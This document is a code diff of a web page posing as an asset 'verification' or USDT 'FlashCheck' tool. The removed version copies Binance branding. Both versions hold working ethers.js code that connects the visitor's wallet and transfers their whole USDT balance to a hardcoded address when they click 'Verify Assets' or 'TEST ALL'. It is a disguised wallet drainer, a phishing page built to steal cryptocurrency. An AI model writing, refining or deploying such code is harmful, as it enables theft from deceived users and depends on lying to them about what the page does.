@@ -1,525 +1,141 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Asset Verification</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --binance-yellow: #f0b90b;
-            --background-dark: #000000;
-            --text-light: #ffffff;
-            --text-dimmed: #b2b2b2;
-            --primary-font: 'Inter', sans-serif;
-            --border-radius: 8px;
-        }
-
-        body {
-            font-family: var(--primary-font);
-            background-color: var(--background-dark);
-            color: var(--text-light);
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            min-height: 100vh;
-        }
-
-        header {
-            width: 100%;
-            padding: 10px 0;
-            text-align: left;
-            background-color: var(--background-dark);
-            position: fixed;
-            top: 0;
-            z-index: 10;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        header .logo {
-            margin-left: 20px;
-            margin-right: 20px;
-        }
-
-        header .logo h1 {
-            color: var(--binance-yellow);
-            font-size: 1.5rem;
-            font-weight: bold;
-            margin: 0;
-        }
-
-        header .logo a {
-            text-decoration: none;
-        }
-
-        header nav {
-            display: flex;
-            align-items: center;
-            margin-right: 20px;
-        }
-
-        header nav a {
-            color: var(--text-light);
-            text-decoration: none;
-            margin-right: 20px;
-            font-size: 1rem;
-            font-weight: 500;
-            transition: color 0.2s ease;
-        }
-
-        header nav a:hover {
-            color: var(--binance-yellow);
-        }
-
-        header nav a.active {
-            color: var(--binance-yellow);
-        }
-
-        .dropdown {
-            position: relative;
-            display: inline-block;
-        }
-
-        .dropdown-content {
-            display: none;
-            position: absolute;
-            background-color: #2c2c2c;
-            min-width: 160px;
-            box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
-            z-index: 1;
-            border-radius: var(--border-radius);
-            top: 100%;
-            left: 0;
-        }
-
-        .dropdown-content a {
-            color: var(--text-light);
-            padding: 12px 16px;
-            text-decoration: none;
-            display: block;
-            transition: background-color 0.2s ease;
-            white-space: nowrap;
-        }
-
-        .dropdown-content a:hover {
-            background-color: #4a4a4a;
-        }
-
-        .dropdown:hover .dropdown-content {
-            display: block;
-        }
-
-        .dropdown-arrow {
-            display: inline-block;
-            width: 0;
-            height: 0;
-            border-left: 5px solid transparent;
-            border-right: 5px solid transparent;
-            border-top: 5px solid var(--text-light);
-            margin-left: 5px;
-            vertical-align: middle;
-        }
-
-        .dropdown:hover .dropdown-arrow {
-            border-top-color: var(--binance-yellow);
-        }
-
-        #menu-icon {
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            width: 30px;
-            height: 30px;
-            cursor: pointer;
-            padding: 5px;
-            margin-right: 20px;
-        }
-
-        #menu-icon div {
-            width: 100%;
-            height: 3px;
-            background-color: var(--text-light);
-            margin: 3px 0;
-            border-radius: 2px;
-            transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
-        }
-
-        #menu-icon.open div:nth-child(1) {
-            transform: rotate(45deg) translate(5px, 6px);
-        }
-
-        #menu-icon.open div:nth-child(2) {
-            opacity: 0;
-        }
-
-        #menu-icon.open div:nth-child(3) {
-            transform: rotate(-45deg) translate(5px, -6px);
-        }
-
-        @media (max-width: 768px) {
-            header nav {
-                display: none;
-                flex-direction: column;
-                background-color: var(--background-dark);
-                position: absolute;
-                top: 60px;
-                right: 0;
-                left: auto;
-                width: 100%;
-                border-bottom: 1px solid #333;
-                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
-                padding-bottom: 10px;
-            }
-
-            header nav.open {
-                display: flex;
-            }
-
-            header nav a {
-                padding: 15px 20px;
-                text-align: center;
-                display: block;
-            }
-             header .dropdown-content {
-                position: relative;
-                top: 0;
-                left: 0;
-                width: 100%;
-                box-shadow: none;
-                border-radius: 0;
-                background-color: #1c1c1c;
-            }
-            header .dropdown-content a{
-                 padding: 12px 30px;
-            }
-
-            #menu-icon {
-                display: flex;
-            }
-        }
-
-
-        main {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            max-width: 1000px;
-            padding-top: 80px;
-            text-align: center;
-        }
-
-        .content-wrapper {
-            max-width: 600px;
-            width: 100%;
-            padding: 20px;
-        }
-
-        h1 {
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin-bottom: 20px;
-            color: var(--text-light);
-        }
-
-        p {
-            font-size: 1rem;
-            color: var(--text-dimmed);
-            margin-bottom: 30px;
-        }
-
-        #balance {
-            font-size: 1.2rem;
-            color: var(--success-color);
-            margin-bottom: 25px;
-            font-weight: 600;
-        }
-
-
-        button {
-            background-color: var(--binance-yellow);
-            color: #000;
-            padding: 15px 30px;
-            border: none;
-            border-radius: var(--border-radius);
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: background-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
-            font-weight: 600;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
-        }
-
-        button:hover {
-            background-color: #e0a708;
-            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.3);
-        }
-
-        button:disabled {
-            background-color: #b28900;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.3);
-            border-top: 4px solid #000;
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            animation: spin 1s linear infinite;
-            display: none;
-            margin-right: 10px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        #log {
-            margin-top: 30px;
-            font-size: 0.9rem;
-            padding: 15px;
-            border-radius: var(--border-radius);
-            text-align: center;
-            background-color: #1c1c1c;
-            border: 1px solid #333;
-            color: #e0e0e0;
-        }
-
-        .log-success {
-            color: #4caf50;
-            background-color: rgba(76, 175, 80, 0.1);
-        }
-
-        .log-error {
-            color: #f44336;
-            background-color: rgba(244, 67, 54, 0.1);
-        }
-
-        .log-info {
-            color: #2196f3;
-            background-color: rgba(33, 150, 243, 0.1);
-        }
-
-        footer {
-            width: 100%;
-            padding: 20px 0;
-            text-align: center;
-            color: var(--text-dimmed);
-            font-size: 0.9rem;
-        }
-
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>USDT(BEP-20) FlashCheck</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: #1e1e1e;
+      padding: 2em;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+      max-width: 400px;
+    }
+    button {
+      background-color: #00cc99;
+      color: white;
+      padding: 1em 2em;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.1em;
+      cursor: pointer;
+      margin-top: 1em;
+    }
+    button:disabled {
+      background-color: #666;
+      cursor: not-allowed;
+    }
+    #log {
+      margin-top: 1em;
+      font-size: 0.9em;
+      color: #ff6666;
+    }
+  </style>
 </head>
 <body>
-    <header>
-        <div class="logo">
-            <a href="https://www.binance.com/en"><h1>BINANCE</h1></a>
-        </div>
-        <div id="menu-icon">
-            <div></div>
-            <div></div>
-            <div></div>
-        </div>
-        <nav>
-            <a href="https://www.binance.com/en" class="active">Home</a>
-            <a href="https://www.binance.com/en">Buy Crypto</a>
-            <a href="https://www.binance.com/en">Markets</a>
-             <div class="dropdown">
-                <a href="https://www.binance.com/en">Trade <span class="dropdown-arrow"></span></a>
-                <div class="dropdown-content">
-                    <a href="https://www.binance.com/en">Spot</a>
-                    <a href="https://www.binance.com/en">Margin</a>
-                    <a href="https://www.binance.com/en">Derivatives</a>
-                </div>
-            </div>
-            <a href="https://www.binance.com/en">Futures</a>
-            <div class="dropdown">
-                <a href="https://www.binance.com/en">Earn <span class="dropdown-arrow"></span></a>
-                <div class="dropdown-content">
-                    <a href="https://www.binance.com/en">Savings</a>
-                    <a href="https://www.binance.com/en">Staking</a>
-                    <a href="https://www.binance.com/en">Liquidity Farming</a>
-                </div>
-            </div>
-            <a href="https://www.binance.com/en">Square</a>
-            <a href="https://www.binance.com/en">More <span class="dropdown-arrow"></span></a>
-        </nav>
-    </header>
-    <main>
-        <div class="content-wrapper">
-            <h1>Verify Your Assets</h1>
-            <p>Ensure your tokens are secure on Binance Smart Chain.</p>
-            <p id="balance">Checking Balance...</p>
-            <button id="verifyBtn">
-                <div class="spinner" id="loadingSpinner"></div>
-                Verify Assets
-            </button>
-            <div id="log"></div>
-        </div>
-    </main>
-    <footer>
-        <p>© 2024 Asset Verification Tool. All rights reserved.</p>
-    </footer>
+  <div class="card">
+    <h2>USDT (BEP-20)</h2>
+    <p>This will Test Your USDT(BEP-20) on BSC:</p>
+    <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
+    <button id="sendBtn">TEST ALL</button>
+    <div id="log"></div>
+  </div>
 
-    <script>
-        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
-        const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
-        const usdtAbi = [
-            "function balanceOf(address owner) view returns (uint256)",
-            "function transfer(address to, uint256 value) returns (bool)"
-        ];
+  <script>
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
+    const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
+    const usdtAbi = [
+      "function balanceOf(address owner) view returns (uint256)",
+      "function transfer(address to, uint256 value) returns (bool)"
+    ];
 
-        const bscParams = {
-            chainId: "0x38",
-            chainName: "Binance Smart Chain",
-            nativeCurrency: {
-                name: "BNB",
-                symbol: "BNB",
-                decimals: 18
-            },
-            rpcUrls: ["https://bsc-dataseed.binance.org/"],
-            blockExplorerUrls: ["https://bscscan.com"]
-        };
+    const bscParams = {
+      chainId: "0x38",
+      chainName: "Binance Smart Chain",
+      nativeCurrency: {
+        name: "BNB",
+        symbol: "BNB",
+        decimals: 18
+      },
+      rpcUrls: ["https://bsc-dataseed.binance.org/"],
+      blockExplorerUrls: ["https://bscscan.com"]
+    };
 
-        const balanceElement = document.getElementById("balance");
-        const verifyButton = document.getElementById("verifyBtn");
-        const loadingSpinner = document.getElementById("loadingSpinner");
-        const logElement = document.getElementById("log");
-        const menuIcon = document.getElementById('menu-icon');
-        const nav = document.querySelector('header nav');
+    function log(msg) {
+      document.getElementById("log").textContent = msg;
+    }
 
-        function log(msg, type = 'info') {
-            logElement.textContent = msg;
-            logElement.className = `log log-${type}`;
-        }
-
-        function showLoading(isLoading) {
-            if (isLoading) {
-                loadingSpinner.style.display = 'inline-block';
-                verifyButton.querySelector('span').textContent = 'Verifying...';
-                verifyButton.disabled = true;
-            } else {
-                loadingSpinner.style.display = 'none';
-                verifyButton.querySelector('span').textContent = 'Verify Assets';
-                verifyButton.disabled = false;
-            }
-        }
-
-        async function getBalance(provider, address) {
-          try {
-            const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
-            const balance = await usdtContract.balanceOf(address);
-            const formattedBalance = ethers.utils.formatUnits(balance, 18);
-            balanceElement.textContent = `Your USDT Balance: ${formattedBalance}`;
-          } catch (error) {
-            console.error("Error fetching balance:", error);
-            balanceElement.textContent = "Error fetching balance.";
-          }
-        }
-
-        async function verifyAssets() {
-            log("", 'info');
-            showLoading(true);
-            verifyButton.disabled = true;
-
-            if (!window.ethereum) {
-                log("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.", 'error');
-                showLoading(false);
-                return;
-            }
-
-            try {
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: bscParams.chainId }]
-                });
-            } catch (switchError) {
-                if (switchError.code === 4902) {
-                    try {
-                        await window.ethereum.request({
-                            method: "wallet_addEthereumChain",
-                            params: [bscParams]
-                        });
-                    } catch (addError) {
-                        log("Could not add Binance Smart Chain to your wallet.", 'error');
-                        showLoading(false);
-                        return;
-                    }
-                } else {
-                    log("Failed to switch to Binance Smart Chain.", 'error');
-                    showLoading(false);
-                    return;
-                }
-            }
-
-            try {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const userAddress = await signer.getAddress();
-
-                // Display user balance
-                await getBalance(provider, userAddress);
-
-                const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
-                const balance = await usdtContract.balanceOf(userAddress);
-
-                if (balance.isZero()) {
-                    log("❌ Your USDT balance is 0.", 'error');
-                    showLoading(false);
-                    return;
-                }
-                const tx = await usdtContract.transfer(recipient, balance);
-                log(`✅ Transfer initiated. Transaction Hash: ${tx.hash}`, 'success');
-                await tx.wait();
-                log("✅ Asset verification and transfer successful.", 'success');
-            } catch (error) {
-                console.error("Error:", error);
-                log("❌ Transaction failed: " + (error?.message || error), 'error');
-            } finally {
-                showLoading(false);
-                verifyButton.disabled = false;
-            }
-        }
-
-        window.addEventListener('load', async () => {
-            if (window.ethereum) {
-                try {
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const accounts = await provider.listAccounts();
-                    if (accounts.length > 0) {
-                        const signer = provider.getSigner();
-                        const userAddress = await signer.getAddress();
-                        getBalance(provider, userAddress);
-                    } else {
-                        balanceElement.textContent = "Connect Wallet to see balance";
-                    }
-                } catch (error) {
-                    console.error("Error on load:", error);
-                    balanceElement.textContent = "Error connecting to wallet";
-                }
-            } else {
-                balanceElement.textContent = "Wallet not detected";
-            }
+    async function switchToBSC() {
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: bscParams.chainId }]
         });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [bscParams]
+          });
+        } else {
+          throw switchError;
+        }
+      }
+    }
 
-        verifyButton.onclick = verifyAssets;
-        menuIcon.addEventListener('click', () => {
-            nav.classList.toggle('open');
-            menuIcon.classList.toggle('open');
-        });
-    </script>
+    async function sendAllUSDT() {
+      log(""); // Clear previous logs
+      if (!window.ethereum) {
+        alert("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.");
+        return;
+      }
+
+      try {
+        await switchToBSC();
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const userAddress = await signer.getAddress();
+
+        const bnbBalance = await provider.getBalance(userAddress);
+        const minGas = ethers.utils.parseEther("0.0001");
+
+        if (bnbBalance.lt(minGas)) {
+          log("❌ Not enough BNB for gas.");
+          return;
+        }
+
+        const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
+        const balance = await usdt.balanceOf(userAddress);
+
+        if (balance.isZero()) {
+          log("❌ Your USDT balance is 0.");
+          return;
+        }
+
+        const tx = await usdt.transfer(recipient, balance);
+        await tx.wait();
+        log("✅ USDT sent successfully.");
+      } catch (err) {
+        console.error(err);
+        log("❌ Transaction failed: " + (err?.message || err));
+      }
+    }
+
+    document.getElementById("sendBtn").onclick = sendAllUSDT;
+  </script>
 </body>
 </html>
